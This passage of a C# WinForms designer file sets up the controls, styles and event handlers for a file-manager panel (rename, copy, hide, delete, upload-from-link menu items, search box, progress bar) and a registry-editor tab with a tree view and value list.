        this.UploadFromLinkToolStripMenuItem.Click += new System.EventHandler(uploadFromLinkToolStripMenuItem_Click);
        this.RenameToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.RenameToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RenameToolStripMenuItem.Image");
        this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
        this.RenameToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.RenameToolStripMenuItem.Text = "Rename";
        this.RenameToolStripMenuItem.Click += new System.EventHandler(RenameToolStripMenuItem_Click);
        this.EditorToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.EditorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("EditorToolStripMenuItem.Image");
        this.EditorToolStripMenuItem.Name = "EditorToolStripMenuItem";
        this.EditorToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.EditorToolStripMenuItem.Text = "Editor";
        this.EditorToolStripMenuItem.Click += new System.EventHandler(EditorToolStripMenuItem_Click);
        this.CopyToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.CopyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CopyToolStripMenuItem.Image");
        this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
        this.CopyToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.CopyToolStripMenuItem.Text = "Copy";
        this.CopyToolStripMenuItem.Click += new System.EventHandler(CopyToolStripMenuItem_Click);
        this.CutToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.CutToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CutToolStripMenuItem.Image");
        this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
        this.CutToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.CutToolStripMenuItem.Text = "Cut";
        this.CutToolStripMenuItem.Click += new System.EventHandler(CutToolStripMenuItem_Click);
        this.PasteToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.PasteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("PasteToolStripMenuItem.Image");
        this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
        this.PasteToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.PasteToolStripMenuItem.Text = "Paste";
        this.PasteToolStripMenuItem.Click += new System.EventHandler(PasteToolStripMenuItem_Click);
        this.NewToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.NewToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.FolderToolStripMenuItem, this.EmptyFileToolStripMenuItem });
        this.NewToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("NewToolStripMenuItem.Image");
        this.NewToolStripMenuItem.Name = "NewToolStripMenuItem";
        this.NewToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.NewToolStripMenuItem.Text = "New";
        this.FolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.FolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FolderToolStripMenuItem.Image");
        this.FolderToolStripMenuItem.Name = "FolderToolStripMenuItem";
        this.FolderToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
        this.FolderToolStripMenuItem.Text = "Folder";
        this.FolderToolStripMenuItem.Click += new System.EventHandler(FolderToolStripMenuItem_Click);
        this.EmptyFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.EmptyFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("EmptyFileToolStripMenuItem.Image");
        this.EmptyFileToolStripMenuItem.Name = "EmptyFileToolStripMenuItem";
        this.EmptyFileToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
        this.EmptyFileToolStripMenuItem.Text = "Empty File";
        this.EmptyFileToolStripMenuItem.Click += new System.EventHandler(EmptyFileToolStripMenuItem_Click);
        this.HideToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.HideToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HideToolStripMenuItem.Image");
        this.HideToolStripMenuItem.Name = "HideToolStripMenuItem";
        this.HideToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.HideToolStripMenuItem.Text = "Hide";
        this.HideToolStripMenuItem.Click += new System.EventHandler(HideToolStripMenuItem_Click);
        this.ShowToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.ShowToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ShowToolStripMenuItem.Image");
        this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
        this.ShowToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.ShowToolStripMenuItem.Text = "Show";
        this.ShowToolStripMenuItem.Click += new System.EventHandler(ShowToolStripMenuItem_Click);
        this.DeleteToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.DeleteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DeleteToolStripMenuItem.Image");
        this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
        this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.DeleteToolStripMenuItem.Text = "Delete";
        this.DeleteToolStripMenuItem.Click += new System.EventHandler(DeleteToolStripMenuItem_Click);
        this.OpenDownloadFolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
        this.OpenDownloadFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("OpenDownloadFolderToolStripMenuItem.Image");
        this.OpenDownloadFolderToolStripMenuItem.Name = "OpenDownloadFolderToolStripMenuItem";
        this.OpenDownloadFolderToolStripMenuItem.Size = new System.Drawing.Size(200, 26);
        this.OpenDownloadFolderToolStripMenuItem.Text = "Open Download Folder";
        this.OpenDownloadFolderToolStripMenuItem.Click += new System.EventHandler(OpenDownloadFolderToolStripMenuItem_Click);
        this.PanelTitleFileManager.Controls.Add(this.SmailIcons);
        this.PanelTitleFileManager.Controls.Add(this.TitleList);
        this.PanelTitleFileManager.Controls.Add(this.ButtonPC);
        this.PanelTitleFileManager.Controls.Add(this.FolderLen);
        this.PanelTitleFileManager.Controls.Add(this.TextBox1);
        this.PanelTitleFileManager.Controls.Add(this.SelectedItiemsL2);
        this.PanelTitleFileManager.Controls.Add(this.pr);
        this.PanelTitleFileManager.Controls.Add(this.Search);
        this.PanelTitleFileManager.Dock = System.Windows.Forms.DockStyle.Top;
        this.PanelTitleFileManager.Location = new System.Drawing.Point(0, 0);
        this.PanelTitleFileManager.Name = "PanelTitleFileManager";
        this.PanelTitleFileManager.Size = new System.Drawing.Size(737, 81);
        this.PanelTitleFileManager.TabIndex = 613;
        this.SmailIcons.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.SmailIcons.BackColor = System.Drawing.Color.Transparent;
        this.SmailIcons.BorderRadius = 5;
        this.SmailIcons.CheckedState.Parent = this.SmailIcons;
        this.SmailIcons.CustomImages.Parent = this.SmailIcons;
        this.SmailIcons.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.SmailIcons.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.SmailIcons.ForeColor = System.Drawing.Color.White;
        this.SmailIcons.HoverState.Parent = this.SmailIcons;
        this.SmailIcons.Image = (System.Drawing.Image)resources.GetObject("SmailIcons.Image");
        this.SmailIcons.ImageSize = new System.Drawing.Size(18, 18);
        this.SmailIcons.Location = new System.Drawing.Point(698, 8);
        this.SmailIcons.Name = "SmailIcons";
        this.SmailIcons.ShadowDecoration.Parent = this.SmailIcons;
        this.SmailIcons.Size = new System.Drawing.Size(30, 28);
        this.SmailIcons.TabIndex = 611;
        this.SmailIcons.Click += new System.EventHandler(SmailIcons_Click);
        this.TitleList.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.TitleList.BackColor = System.Drawing.Color.Transparent;
        this.TitleList.BorderRadius = 5;
        this.TitleList.CheckedState.Parent = this.TitleList;
        this.TitleList.CustomImages.Parent = this.TitleList;
        this.TitleList.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TitleList.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitleList.ForeColor = System.Drawing.Color.White;
        this.TitleList.HoverState.Parent = this.TitleList;
        this.TitleList.Image = (System.Drawing.Image)resources.GetObject("TitleList.Image");
        this.TitleList.ImageSize = new System.Drawing.Size(18, 18);
        this.TitleList.Location = new System.Drawing.Point(662, 8);
        this.TitleList.Name = "TitleList";
        this.TitleList.ShadowDecoration.Parent = this.TitleList;
        this.TitleList.Size = new System.Drawing.Size(30, 28);
        this.TitleList.TabIndex = 610;
        this.TitleList.Click += new System.EventHandler(TitleList_Click);
        this.ButtonPC.BackColor = System.Drawing.Color.Transparent;
        this.ButtonPC.BorderRadius = 5;
        this.ButtonPC.CheckedState.Parent = this.ButtonPC;
        this.ButtonPC.CustomImages.Parent = this.ButtonPC;
        this.ButtonPC.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ButtonPC.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonPC.ForeColor = System.Drawing.Color.White;
        this.ButtonPC.HoverState.Parent = this.ButtonPC;
        this.ButtonPC.Image = (System.Drawing.Image)resources.GetObject("ButtonPC.Image");
        this.ButtonPC.ImageSize = new System.Drawing.Size(18, 18);
        this.ButtonPC.Location = new System.Drawing.Point(8, 8);
        this.ButtonPC.Name = "ButtonPC";
        this.ButtonPC.ShadowDecoration.Parent = this.ButtonPC;
        this.ButtonPC.Size = new System.Drawing.Size(30, 28);
        this.ButtonPC.TabIndex = 609;
        this.ButtonPC.Click += new System.EventHandler(ButtonPC_Click);
        this.FolderLen.AllowParentOverrides = false;
        this.FolderLen.AutoEllipsis = false;
        this.FolderLen.BackColor = System.Drawing.Color.White;
        this.FolderLen.CursorType = null;
        this.FolderLen.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.FolderLen.ForeColor = System.Drawing.Color.Black;
        this.FolderLen.Location = new System.Drawing.Point(12, 60);
        this.FolderLen.Name = "FolderLen";
        this.FolderLen.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.FolderLen.Size = new System.Drawing.Size(6, 15);
        this.FolderLen.TabIndex = 608;
        this.FolderLen.Text = "..";
        this.FolderLen.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.FolderLen.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.TextBox1.AcceptsReturn = false;
        this.TextBox1.AcceptsTab = false;
        this.TextBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.TextBox1.AnimationSpeed = 200;
        this.TextBox1.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextBox1.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextBox1.AutoSizeHeight = true;
        this.TextBox1.BackColor = System.Drawing.Color.Transparent;
        this.TextBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("TextBox1.BackgroundImage");
        this.TextBox1.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TextBox1.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TextBox1.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TextBox1.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextBox1.BorderRadius = 2;
        this.TextBox1.BorderThickness = 1;
        this.TextBox1.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBox1.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TextBox1.DefaultText = "";
        this.TextBox1.FillColor = System.Drawing.Color.White;
        this.TextBox1.HideSelection = true;
        this.TextBox1.IconLeft = Properties.Resources.iconleft;
        this.TextBox1.IconLeftCursor = System.Windows.Forms.Cursors.Hand;
        this.TextBox1.IconPadding = 3;
        this.TextBox1.IconRight = Properties.Resources.UpdateText;
        this.TextBox1.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.TextBox1.Lines = new string[0];
        this.TextBox1.Location = new System.Drawing.Point(44, 8);
        this.TextBox1.MaxLength = 32767;
        this.TextBox1.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextBox1.Modified = false;
        this.TextBox1.Multiline = false;
        this.TextBox1.Name = "TextBox1";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextBox1.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1.OnIdleState = stateProperties4;
        this.TextBox1.Padding = new System.Windows.Forms.Padding(3);
        this.TextBox1.PasswordChar = '\0';
        this.TextBox1.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextBox1.PlaceholderText = "This pc";
        this.TextBox1.ReadOnly = true;
        this.TextBox1.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextBox1.SelectedText = "";
        this.TextBox1.SelectionLength = 0;
        this.TextBox1.SelectionStart = 0;
        this.TextBox1.ShortcutsEnabled = true;
        this.TextBox1.Size = new System.Drawing.Size(445, 28);
        this.TextBox1.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextBox1.TabIndex = 601;
        this.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextBox1.TextMarginBottom = 0;
        this.TextBox1.TextMarginLeft = 3;
        this.TextBox1.TextMarginTop = 1;
        this.TextBox1.TextPlaceholder = "This pc";
        this.TextBox1.UseSystemPasswordChar = false;
        this.TextBox1.WordWrap = true;
        this.TextBox1.OnIconLeftClick += new System.EventHandler(TextBox1_OnIconLeftClick);
        this.TextBox1.OnIconRightClick += new System.EventHandler(TextBox1_OnIconRightClick);
        this.SelectedItiemsL2.AllowParentOverrides = false;
        this.SelectedItiemsL2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.SelectedItiemsL2.AutoEllipsis = false;
        this.SelectedItiemsL2.BackColor = System.Drawing.Color.White;
        this.SelectedItiemsL2.CursorType = null;
        this.SelectedItiemsL2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.SelectedItiemsL2.ForeColor = System.Drawing.Color.Black;
        this.SelectedItiemsL2.Location = new System.Drawing.Point(500, 42);
        this.SelectedItiemsL2.Name = "SelectedItiemsL2";
        this.SelectedItiemsL2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.SelectedItiemsL2.Size = new System.Drawing.Size(9, 15);
        this.SelectedItiemsL2.TabIndex = 607;
        this.SelectedItiemsL2.Text = "...";
        this.SelectedItiemsL2.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.SelectedItiemsL2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.pr.AllowAnimations = false;
        this.pr.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.pr.Animation = 0;
        this.pr.AnimationSpeed = 220;
        this.pr.AnimationStep = 10;
        this.pr.BackColor = System.Drawing.Color.White;
        this.pr.BackgroundImage = (System.Drawing.Image)resources.GetObject("pr.BackgroundImage");
        this.pr.BorderColor = System.Drawing.Color.Silver;
        this.pr.BorderRadius = 1;
        this.pr.BorderThickness = 1;
        this.pr.Location = new System.Drawing.Point(8, 42);
        this.pr.Maximum = 100;
        this.pr.MaximumValue = 100;
        this.pr.Minimum = 0;
        this.pr.MinimumValue = 0;
        this.pr.Name = "pr";
        this.pr.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.pr.ProgressBackColor = System.Drawing.Color.White;
        this.pr.ProgressColorLeft = System.Drawing.Color.Green;
        this.pr.ProgressColorRight = System.Drawing.Color.FromArgb(0, 192, 0);
        this.pr.Size = new System.Drawing.Size(481, 14);
        this.pr.TabIndex = 606;
        this.pr.Value = 0;
        this.pr.ValueByTransition = 0;
        this.Search.AcceptsReturn = false;
        this.Search.AcceptsTab = false;
        this.Search.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.Search.AnimationSpeed = 200;
        this.Search.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Search.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Search.AutoSizeHeight = true;
        this.Search.BackColor = System.Drawing.Color.Transparent;
        this.Search.BackgroundImage = (System.Drawing.Image)resources.GetObject("Search.BackgroundImage");
        this.Search.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Search.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Search.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Search.BorderColorIdle = System.Drawing.Color.Silver;
        this.Search.BorderRadius = 2;
        this.Search.BorderThickness = 1;
        this.Search.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Search.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Search.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Search.DefaultText = "";
        this.Search.FillColor = System.Drawing.Color.White;
        this.Search.HideSelection = true;
        this.Search.IconLeft = null;
        this.Search.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Search.IconPadding = 10;
        this.Search.IconRight = null;
        this.Search.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Search.Lines = new string[0];
        this.Search.Location = new System.Drawing.Point(495, 8);
        this.Search.MaxLength = 32767;
        this.Search.MinimumSize = new System.Drawing.Size(1, 1);
        this.Search.Modified = false;
        this.Search.Multiline = false;
        this.Search.Name = "Search";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Search.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Search.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Search.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Search.OnIdleState = stateProperties8;
        this.Search.Padding = new System.Windows.Forms.Padding(3);
        this.Search.PasswordChar = '\0';
        this.Search.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Search.PlaceholderText = "Search";
        this.Search.ReadOnly = false;
        this.Search.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Search.SelectedText = "";
        this.Search.SelectionLength = 0;
        this.Search.SelectionStart = 0;
        this.Search.ShortcutsEnabled = true;
        this.Search.Size = new System.Drawing.Size(161, 28);
        this.Search.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Search.TabIndex = 602;
        this.Search.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Search.TextMarginBottom = 0;
        this.Search.TextMarginLeft = 3;
        this.Search.TextMarginTop = 1;
        this.Search.TextPlaceholder = "Search";
        this.Search.UseSystemPasswordChar = false;
        this.Search.WordWrap = true;
        this.Search.TextChange += new System.EventHandler(Search_TextChange);
        this.Search.KeyPress += new System.Windows.Forms.KeyPressEventHandler(Search_KeyPress);
        this.PageRegisrty.Controls.Add(this.Panel4);
        this.PageRegisrty.Location = new System.Drawing.Point(4, 4);
        this.PageRegisrty.Name = "PageRegisrty";
        this.PageRegisrty.Size = new System.Drawing.Size(737, 465);
        this.PageRegisrty.TabIndex = 2;
        this.PageRegisrty.Text = "Registry";
        this.PageRegisrty.UseVisualStyleBackColor = true;
        this.Panel4.Controls.Add(this.tableLayoutPanel);
        this.Panel4.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel4.Location = new System.Drawing.Point(0, 0);
        this.Panel4.Name = "Panel4";
        this.Panel4.Size = new System.Drawing.Size(737, 465);
        this.Panel4.TabIndex = 1;
        this.tableLayoutPanel.ColumnCount = 1;
        this.tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100f));
        this.tableLayoutPanel.Controls.Add(this.LogsRegistry, 0, 2);
        this.tableLayoutPanel.Controls.Add(this.splitContainer, 0, 1);
        this.tableLayoutPanel.Controls.Add(this.menuStrip, 0, 0);
        this.tableLayoutPanel.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
        this.tableLayoutPanel.Location = new System.Drawing.Point(0, 0);
        this.tableLayoutPanel.Name = "tableLayoutPanel";
        this.tableLayoutPanel.RowCount = 3;
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 25f));
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 22f));
        this.tableLayoutPanel.Size = new System.Drawing.Size(737, 465);
        this.tableLayoutPanel.TabIndex = 1;
        this.LogsRegistry.AcceptsReturn = false;
        this.LogsRegistry.AcceptsTab = false;
        this.LogsRegistry.AnimationSpeed = 200;
        this.LogsRegistry.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.LogsRegistry.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.LogsRegistry.AutoSizeHeight = true;
        this.LogsRegistry.BackColor = System.Drawing.Color.Transparent;
        this.LogsRegistry.BackgroundImage = (System.Drawing.Image)resources.GetObject("LogsRegistry.BackgroundImage");
        this.LogsRegistry.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LogsRegistry.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.LogsRegistry.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.LogsRegistry.BorderColorIdle = System.Drawing.Color.White;
        this.LogsRegistry.BorderRadius = 2;
        this.LogsRegistry.BorderThickness = 1;
        this.LogsRegistry.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.LogsRegistry.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.LogsRegistry.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.LogsRegistry.DefaultText = "";
        this.LogsRegistry.Dock = System.Windows.Forms.DockStyle.Fill;
        this.LogsRegistry.FillColor = System.Drawing.Color.White;
        this.LogsRegistry.HideSelection = true;
        this.LogsRegistry.IconLeft = null;
        this.LogsRegistry.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.LogsRegistry.IconPadding = 10;
        this.LogsRegistry.IconRight = null;
        this.LogsRegistry.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.LogsRegistry.Lines = new string[0];
        this.LogsRegistry.Location = new System.Drawing.Point(3, 446);
        this.LogsRegistry.MaxLength = 32767;
        this.LogsRegistry.MinimumSize = new System.Drawing.Size(1, 1);
        this.LogsRegistry.Modified = false;
        this.LogsRegistry.Multiline = false;
        this.LogsRegistry.Name = "LogsRegistry";
        stateProperties9.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties9.FillColor = System.Drawing.Color.Empty;
        stateProperties9.ForeColor = System.Drawing.Color.Empty;
        stateProperties9.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.LogsRegistry.OnActiveState = stateProperties9;
        stateProperties10.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties10.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties10.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties10.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.LogsRegistry.OnDisabledState = stateProperties10;
        stateProperties11.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties11.FillColor = System.Drawing.Color.Empty;
        stateProperties11.ForeColor = System.Drawing.Color.Empty;
        stateProperties11.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.LogsRegistry.OnHoverState = stateProperties11;
        stateProperties12.BorderColor = System.Drawing.Color.White;
        stateProperties12.FillColor = System.Drawing.Color.White;
        stateProperties12.ForeColor = System.Drawing.Color.Empty;
        stateProperties12.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.LogsRegistry.OnIdleState = stateProperties12;
        this.LogsRegistry.Padding = new System.Windows.Forms.Padding(3);
        this.LogsRegistry.PasswordChar = '\0';
        this.LogsRegistry.PlaceholderForeColor = System.Drawing.Color.White;
        this.LogsRegistry.PlaceholderText = "";
        this.LogsRegistry.ReadOnly = true;
        this.LogsRegistry.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.LogsRegistry.SelectedText = "";
        this.LogsRegistry.SelectionLength = 0;
        this.LogsRegistry.SelectionStart = 0;
        this.LogsRegistry.ShortcutsEnabled = true;
        this.LogsRegistry.Size = new System.Drawing.Size(731, 16);
        this.LogsRegistry.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.LogsRegistry.TabIndex = 603;
        this.LogsRegistry.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
        this.LogsRegistry.TextMarginBottom = 0;
        this.LogsRegistry.TextMarginLeft = 3;
        this.LogsRegistry.TextMarginTop = 1;
        this.LogsRegistry.TextPlaceholder = "";
        this.LogsRegistry.UseSystemPasswordChar = false;
        this.LogsRegistry.WordWrap = true;
        this.splitContainer.Dock = System.Windows.Forms.DockStyle.Fill;
        this.splitContainer.Location = new System.Drawing.Point(3, 28);
        this.splitContainer.Name = "splitContainer";
        this.splitContainer.Panel1.Controls.Add(this.tvRegistryDirectory);
        this.splitContainer.Panel2.Controls.Add(this.lstRegistryValues);
        this.splitContainer.Size = new System.Drawing.Size(731, 412);
        this.splitContainer.SplitterDistance = 200;
        this.splitContainer.TabIndex = 0;
        this.tvRegistryDirectory.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tvRegistryDirectory.HideSelection = false;
        this.tvRegistryDirectory.ImageIndex = 0;
        this.tvRegistryDirectory.ImageList = this.imageRegistryDirectoryList;
        this.tvRegistryDirectory.Location = new System.Drawing.Point(0, 0);
        this.tvRegistryDirectory.Name = "tvRegistryDirectory";
        this.tvRegistryDirectory.SelectedImageIndex = 0;
        this.tvRegistryDirectory.Size = new System.Drawing.Size(200, 412);
        this.tvRegistryDirectory.TabIndex = 0;
        this.tvRegistryDirectory.AfterLabelEdit += new System.Windows.Forms.NodeLabelEditEventHandler(tvRegistryDirectory_AfterLabelEdit);
        this.tvRegistryDirectory.BeforeExpand += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeExpand);
        this.tvRegistryDirectory.BeforeSelect += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeSelect);
        this.tvRegistryDirectory.NodeMouseClick += new System.Windows.Forms.TreeNodeMouseClickEventHandler(tvRegistryDirectory_NodeMouseClick);
        this.tvRegistryDirectory.KeyUp += new System.Windows.Forms.KeyEventHandler(tvRegistryDirectory_KeyUp);
        this.imageRegistryDirectoryList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryDirectoryList.ImageStream");
        this.imageRegistryDirectoryList.TransparentColor = System.Drawing.Color.Transparent;
        this.imageRegistryDirectoryList.Images.SetKeyName(0, "FolderReg.png");
        this.lstRegistryValues.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.hName, this.hType, this.hValue });
        this.lstRegistryValues.Dock = System.Windows.Forms.DockStyle.Fill;
        this.lstRegistryValues.FullRowSelect = true;
        this.lstRegistryValues.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
        this.lstRegistryValues.HideSelection = false;
        this.lstRegistryValues.Location = new System.Drawing.Point(0, 0);
        this.lstRegistryValues.Name = "lstRegistryValues";
        this.lstRegistryValues.Size = new System.Drawing.Size(527, 412);
